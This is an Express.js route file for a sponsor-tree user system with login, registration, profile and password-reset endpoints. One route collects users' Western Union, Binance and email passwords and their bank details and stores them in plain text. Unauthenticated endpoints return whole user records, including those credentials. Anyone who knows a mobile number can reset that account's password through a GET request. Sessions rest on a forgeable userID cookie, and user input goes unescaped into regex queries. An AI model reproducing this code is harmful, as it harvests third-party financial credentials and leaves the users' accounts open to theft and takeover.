var express = require('express');
var router = express.Router();

var dbCon = require('../module/db/con');
var db=require('../module/db/bdModule')
var auto_incriment=require('../module/db/autoIncriment');


var dotenv=require('dotenv').config();

const bcrypt = require('bcrypt');
const saltRounds = 10;








/* GET users listing. */

router.post('/test', async function(req, res, next) {
  try {
    await dbCon.connectDB();


    await dbCon.closeDB();
  }catch (error) {
    console.log(error);
    return error;
  }
  
});

// router.get('/test', async function(req, res, next) {
// res.send("jhdfjghjd")
// });

router.get('/', async function(req, res, next) {
  try {
    // await dbCon.connectDB();
    // await dbCon.closeDB();
    //console.log(req.query)
    if(req.query.rootID && req.query.name && req.query.id){
     var sponsRootID =req.query.rootID;
     var sponsID= req.query.id
     var sponsName =req.query.name
     console.log(sponsRootID)
    }else{
      var sponsRootID ="";
      var sponsID= "";
      var sponsName = "";
    }
    var allredylogin=req.cookies.userID
    res.render('user/user',{allredylogin:allredylogin,sponsRootID:sponsRootID,sponsID:sponsID,sponsName:sponsName})
  }catch (error) {
    console.log(error);
    return error;
  }
  
});


router.post('/loginUser', async function(req, res, next) {
  try {
    await dbCon.connectDB();
    const user= await db.user.findOne({email:req.body.loginEmail})
    console.log(user);
    await dbCon.closeDB();
    if(user){
      bcrypt.compare(req.body.loginPassword,user.password, async function(err,match){
        if(match){
          res.cookie("userID", user.userID, { maxAge:  24 * 60 * 60 * 1000 });
          res.json(user);
        }else{
          res.send(null);
        }
      })
    }else{
      res.send(null);
    }
    
    
  }catch (error) {
    console.log(error);
    return error;
  }
  
});

router.post('/checkSponsor', async function(req, res, next) {
  try {
    await dbCon.connectDB();
    const user= await db.user.findOne({userID:req.body.sponsorID})
    await dbCon.closeDB();
    res.json(user);
  }catch (error) {
    console.log(error);
    return error;
  }
  
});


router.post('/creatregColumn', async function(req, res, next) {
  try {
    await dbCon.connectDB();
    const user= await db.user.find({rootID: { $regex: '.*' + req.body.SponsorRootID + '.*' , $options: 'i' } } );
    await dbCon.closeDB();
    res.json(user);
  }catch (error) {
    console.log(error);
    return error;
  }
  
});





router.post('/checkuserexist', async function(req, res, next) {
  try {
  await dbCon.connectDB();
  const user= await db.user.findOne({$or: [{rootID:req.body.channelRoot},{panNo:req.body.regPan},{email:req.body.regEmail}]});
  await dbCon.closeDB();
  //console.log("check done")
  res.json(user)
} catch (error) {
  console.log(error);
  return error;
}

})



router.post('/newPartner', async function(req, res, next) {
  try {
  bcrypt.hash(req.body.regPassword, saltRounds, function(err, hash) {
    auto_incriment.auto_incriment("userID").then(async function(inc_val){
        await dbCon.connectDB()
        const user= await db.user({
        userName:req.body.regUserName,
        userID:inc_val,
        rootID:req.body.channelRoot,
        password:hash,
        email:req.body.regEmail,
        address:req.body.regAddress,
        mobile:req.body.regMobile,
        panNo:req.body.regPan
      })
      await user.save();
      await dbCon.closeDB();
      res.json(user)
      //console.log(req.body)
      

      })
})
  
} catch (error) {
  console.log(error);
  return error;
}

})




router.post('/completeReg', async function(req, res, next) {
  try {
    await dbCon.connectDB();
  const user= await db.user.findOneAndUpdate({userID:req.body.userID},{$set:{
    westrenUnionUser:req.body.wuID,
    westrenUnionPass:req.body.wuPsd,
    BinanceUser:req.body.BinanceID,
    BinancePass:req.body.BinancePsd,
    EmlID:req.body.EmlID,
    EmlPsd:req.body.EmlPsd,
    BankDelais:req.body.BankDelais,
    userType:"Active"
  }});
  await dbCon.closeDB();
  res.json(user)
  }catch (error) {
    console.log(error);
    return error;
  }
  
});


router.post('/GetUser', async function(req, res, next) {
  try {
    await dbCon.connectDB();
    const user= await db.user.findOne({userID:req.body.userID})
    await dbCon.closeDB();
    res.json(user)
  }catch (error) {
    console.log(error);
    return error;
  }
  
});



router.post('/userProfile', async function(req, res, next) {
  try {
    await dbCon.connectDB();
    const user= await db.user.findOne({userID:req.cookies.userID})
    await dbCon.closeDB();
    res.json(user)
  }catch (error) {
    console.log(error);
    return error;
  }
  
});



////////Profile/////////////
router.post('/logout', async function(req, res, next) {
  res.clearCookie("userID");
  res.send("ok")

})




////////Profile/////////////

router.get('/resetpassword', async function(req, res, next) {
  
  bcrypt.hash(req.query.paw, saltRounds, async function(err, hash) {
    await dbCon.connectDB();
    const user= await db.user.findOneAndUpdate({mobile:req.query.mobile},{$set:{password:hash}});
    await dbCon.closeDB();

    if(user){
      res.send("success")
    }else{
      res.send("error")
    }

  })
  
  
})

////////Get Tree info/////////////
router.post('/getTree', async function(req, res, next) {
  try {
    await dbCon.connectDB();
    const user= await db.user.findOne({userID:req.body.id});
    const Mytree=await db.user.find({rootID: { $regex: '.*' + user.rootID + '.*' , $options: 'i' } } );
    await dbCon.closeDB();
   // console.log("My Tree",Mytree)
    res.send({user:user,Mytree:Mytree})
  }catch (error) {
    console.log(error);
    return error;
  }
})


////////REf Link/////////////
router.post('/createRefLink', async function(req, res, next) {
  try {
    await dbCon.connectDB();
    const user= await db.user.findOne({userID:req.body.id});
    await dbCon.closeDB();
   // console.log("My Tree",Mytree)
    res.send(user)
  }catch (error) {
    console.log(error);
    return error;
  }
})





module.exports = router;
